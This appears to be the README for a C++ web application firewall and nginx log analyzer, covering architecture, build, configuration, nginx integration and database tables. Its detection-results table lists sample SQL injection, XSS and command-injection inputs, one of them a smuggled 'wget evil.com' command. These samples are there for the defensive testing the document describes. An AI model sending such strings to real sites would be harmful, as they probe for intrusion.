<div align="center">

# Mcaster1BackDraft

**Web Application Firewall + nginx Log Analyzer**

[![Version](https://img.shields.io/badge/version-v0.0.1a-orange?style=flat-square)](https://mcaster1.com)
[![License](https://img.shields.io/badge/license-Proprietary-red?style=flat-square)](LICENSE.md)
[![Platform](https://img.shields.io/badge/platform-Linux-lightgrey?style=flat-square&logo=linux&logoColor=white)](https://mcaster1.com)
[![C++17](https://img.shields.io/badge/C%2B%2B-17-00599C?style=flat-square&logo=cplusplus&logoColor=white)](https://en.cppreference.com/w/cpp/17)
[![MySQL](https://img.shields.io/badge/MySQL-MariaDB-4479A1?style=flat-square&logo=mysql&logoColor=white)](https://mariadb.org)
[![nginx](https://img.shields.io/badge/nginx-integration-009639?style=flat-square&logo=nginx&logoColor=white)](https://nginx.org)
[![WAF Rules](https://img.shields.io/badge/WAF_Rules-9_active-f59e0b?style=flat-square)](https://mcaster1.com)
[![Sites](https://img.shields.io/badge/Sites-27_discovered-22c55e?style=flat-square)](https://mcaster1.com)

<br>

*A single-binary C++ WAF and log analysis engine for the Mcaster1 broadcast platform.*

</div>

---

## What It Does

Mcaster1BackDraft is a **Web Application Firewall** and **nginx log analyzer** that protects and monitors all sites on your server. One C++ daemon, three ports, zero external dependencies beyond MySQL and PHP-FPM.

```
Browser → nginx (443)
    → location = /page.php
        → proxy_pass to BackDraft (9432)
            → WAF inspects, scores, logs to MySQL
            → FastCGI forward to PHP-FPM (unix socket)
            → PHP executes, returns response
        → nginx returns to browser
```

No proxy loops. No sidecar binaries. No bullshit.

---

## Architecture

**Single binary. Three ports. One process.**

| Port | Role |
|------|------|
| **9432** | WAF proxy — receives nginx-proxied traffic, inspects, scores, logs, forwards to PHP-FPM via FastCGI |
| **8862** | Web UI — PHP dashboard via FastCGI, dark cybersecurity theme, Chart.js analytics |
| **8832** | API — REST endpoints for rules, users, sites, threats, performance |

All three ports share a thread pool (auto-sized: CPU cores * 4, capped by available memory).

---

## Key Features

- **WAF Rule Engine** — 9 built-in rules (SQLi, XSS, path traversal, command injection, PHP exploits, empty UA, bad methods), custom rules, learned rules
- **URL-Decoded Inspection** — decodes `%XX` and `+` before matching, catches encoded attacks
- **Threat Scoring** — per-request score (0-100), configurable threshold, severity classification
- **Learning Mode** — logs and scores everything, never blocks (default)
- **Multi-Site** — discovers all 27 nginx sites from `/etc/nginx/sites-enabled/`, per-site WAF enrollment
- **Per-Page Protection** — WAF location blocks target specific pages, not entire sites
- **Agent Fingerprinting** — 14 built-in signatures (Nikto, SQLMap, Nmap, Nuclei, Burp blocked; Googlebot, Bingbot allowed)
- **IP Reputation** — tracks threat scores per IP, auto-ban support
- **Log Analysis** — Chart.js dashboards parsing nginx access/error logs directly (hourly traffic, status codes, top pages, top IPs, top agents, referers)
- **Self-Performance Monitoring** — CPU, memory, threads, FDs, WAF throughput per 10-second interval
- **FastCGI Client** — built-in FastCGI protocol implementation, talks directly to PHP-FPM unix sockets
- **Thread Pool** — bounded worker pool per port, auto-sized from system CPU/memory
- **PHP Dashboard** — 13 pages: login, dashboard, threats, agents, analytics, rules, sites, pages, logs, performance, users, settings, profile
- **CRUD** — full create/edit/delete for rules, users, sites; modal editors; inline toggles
- **Dual Clocks** — military (24h) + civilian (12h) in top bar, updated every second
- **WAF Mode Pill** — green LEARNING / red ACTIVE / gray DISABLED indicator

---

## Build

```bash
cd /var/www/mcaster1.com/Mcaster1BackDraft
./autogen.sh
./configure
make -j$(nproc)
# Binary: src/Mcaster1BackDraft
```

### Dependencies (apt)

```bash
apt install libssl-dev libyaml-cpp-dev libmariadb-dev nlohmann-json3-dev autoconf automake
```

### Database

```bash
mysql --defaults-extra-file=~/.my.cnf < sql/schema.sql
```

### Run

```bash
./src/Mcaster1BackDraft -c etc/Mcaster1BackDraft.yaml
```

---

## Configuration

Single YAML file: `etc/Mcaster1BackDraft.yaml`

```yaml
http:
  web_port: 8862      # Dashboard + PHP-FPM
  api_port: 8832      # Management API
  waf_port: 9432      # WAF proxy (receives nginx traffic)

waf:
  mode: learning       # learning | active | disabled
  threat_threshold: 75
  upstream_fcgi: "/run/php/php8.2-fpm.sock"
```

---

## nginx Integration

Add a `location` block in your site config that proxies specific pages to BackDraft:

```nginx
location = /page.php {
    proxy_pass https://127.0.0.1:9432;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-BackDraft-Page "mysite.com/page.php";
    proxy_buffering off;
}
```

BackDraft inspects the request, logs it, then forwards to PHP-FPM directly via FastCGI. No proxy loop — nginx is only hit once.

---

## Database

MySQL/MariaDB: `mcaster1_backdraft` — 16 tables:

| Table | Purpose |
|-------|---------|
| `backdraft_users` | Admin users (superadmin, admin, user roles) |
| `backdraft_sessions` | Auth session tokens |
| `backdraft_rules` | WAF rules (builtin, custom, learned, imported) |
| `backdraft_requests` | Every WAF-inspected request with threat score |
| `backdraft_threats` | Elevated threat events |
| `backdraft_agent_signatures` | Known bot/scanner/crawler patterns |
| `backdraft_page_profiles` | Per-page behavioral baselines |
| `backdraft_ip_reputation` | IP reputation scores and bans |
| `backdraft_sites` | Discovered nginx sites with doc_root |
| `backdraft_config` | Runtime key-value config |
| `backdraft_perf_metrics` | Self-performance monitoring |
| `backdraft_log_*` | Log analysis aggregation tables |
| `backdraft_error_log` | Parsed nginx error log entries |
| `backdraft_audit_log` | Admin action audit trail |

---

## WAF Detection Results

Tested attack patterns with URL-encoded payloads:

| Attack | Payload | Score | Action | Rule |
|--------|---------|-------|--------|------|
| SQL Injection | `?id=1 UNION SELECT *` | 80 | flag | #1 |
| XSS | `?q=<script>alert(1)</script>` | 85 | flag | #4 |
| Command Injection | `?cmd=; wget evil.com` | 95 | flag | #5 |
| Clean Request | `/mcaster1amp.php` | 0 | pass | — |

---

## Mcaster1 Ecosystem

| Component | Role |
|-----------|------|
| **Mcaster1BackDraft** | WAF + log analyzer (this project) |
| **Mcaster1Studio** | Broadcast automation suite |
| **Mcaster1DNAS** | Streaming server |
| **Mcaster1DSPEncoder** | Broadcast encoder |
| **Mcaster1AudioPipe** | Virtual audio routing |
| **Mcaster1AMP** | Desktop media player |
| **Mcaster1TagStack** | Metadata composer |
| **Mcaster1CastIt** | Stats monitor |

---

## License

Proprietary. Copyright (c) 2026 Mcaster1 / David St. John. All rights reserved.
